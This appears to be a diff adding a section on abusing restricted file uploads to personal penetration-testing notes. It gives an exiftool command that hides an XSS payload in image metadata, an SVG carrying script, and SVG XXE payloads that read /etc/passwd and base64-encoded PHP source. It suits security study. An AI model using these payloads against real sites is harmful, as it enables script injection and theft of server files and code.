@@ -57,3 +57,43 @@ To determine what kind of filters are in place, we can try the following:
 | Disallowed | Disallowed   | Allowed    | MIME-Type &/ Content-Type filtering |
 | Disallowed | Allowed      | Disallowed | MIME-Type &/ Extension filtering    |
 
+## Limited File Uploads
+Some file upload forms will have protections that cannot be bypassed, however, this doesn't mean that we can't abuse these still...
+### XSS
+Javascript code could be included in an uploaded file (eg. image metadata) which might then be able to be used as a [[Cross-Site Scripting (XSS)#Stored XSS|Stored XSS]] exploit.
+```bash
+# Change the image metedata comment to include an XSS payload
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
+```
+If the metadata of an image was viewable on the site, it may allow for XSS. We might be able to change the image's MIME-Type to `text/html` which some applications may interpret as a HTML document instead of an image.
+
+This can also be done for other formats like `SVG`
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+	<rect x="1" y="1" width="1" height="1" fill="white" />
+	<script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+### XXE
+As `SVG` files are XML-based, we can also do XXE attacks via them.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+As reading files is particularly important for web applications, we might able to view source code. Eg.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+> XXE isn't limited to just SVGs, any file type that contains XML data can be used (eg. PDF, Word, PowerPoint). Many files use XML for its formatting.
+> XXE can also be used to trigger SSRF attacks.
+
+### DoS
+Decompression 
+
+
